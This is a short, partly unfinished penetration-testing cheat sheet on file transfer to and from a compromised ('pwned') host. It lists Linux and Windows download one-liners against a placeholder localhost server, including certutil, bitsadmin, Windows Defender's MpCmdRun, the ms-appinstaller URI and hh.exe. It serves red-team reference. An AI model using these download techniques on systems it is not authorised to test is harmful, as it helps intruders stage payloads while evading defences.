# Exfiltration/Transfer Methodology 🚁
This file will be fulfilled in the future with methodologies on data exfiltration and file transfer from the pwned target.
# Linux
### HTTP transfer
With `wget`
```bash
wget http://127.0.0.1:8000/hello -O /dev/shm/volatile_hello
```
With `curl`
```bash
curl "http://127.0.0.1:8000/hello" -o /dev/shm/hello
```
With `telnet`
```bash
(echo 'GET hello'; echo ""; sleep 1; ) | telnet 127.0.0.1 8000 > hello.txt
```
### FTP transfer
### SCP transfer
### SMB transfer
### Sharing folder over RDP
### Other methods
With `base64` encoding
```bash
# from sender terminal
cat file_2_encode | base64 > file_encoded
# copy the encoded file to your clipboard
# or transfer it via other means

# from receiver terminal
cat file_encoded | base64 -d > file_decoded
```
# Windows
### HTTP transfer
With `powershell`
```powershell
# With WebClient
(New-Object System.Net.WebClient).DownloadFile("http://127.0.0.1:8000/hello","hello")
# With Invoke-WebRequest
Invoke-WebRequest -Uri http://127.0.0.1:8000/hello -OutFile hello
iwr http://127.0.0.1:8000/hello -outf hello
```

With `curl.exe` (Included by default on Windows 10):
```bash
curl --url http://127.0.0.1:8000/hello
```
 With `bitsadmin`
 ```bash
bitsadmin /transfer myDownloadJob /download /priority normal http://127.0.0.1:8000/hello c:\temp\hello 
 ```
 With `certutil.exe`
 ```bash
certutil.exe -urlcache -split -f "https://127.0.0.1:8000/hello" hello
 ```
 With `MpCmdRun.exe` (Windows Defender)
 ```bash
 "%ProgramFiles%\Windows Defender\MpCmdRun.exe" -DownloadFile -URL "http://127.0.0.1:8000/hello" -path "C:\temp\hello"
 ```
 With `AppInstaller.exe`
> AppInstaller.exe is spawned by the default handler for the URI, it attempts to load/install a package from the URL and is saved in `C:\Users\%username%\AppData\Local\Packages\Microsoft.DesktopAppInstaller_8wekyb3d8bbwe\AC\INetCache\`
 ```bash
start ms-appinstaller://?source=http://127.0.0.1:8000/update.msi
 ```
 With `Hh.exe`
 ```bash
 hh.exe http://127.0.0.1:8000/hello
 ```
 ### FTP transfer
### SCP transfer
### SMB transfer
### Sharing folder over RDP
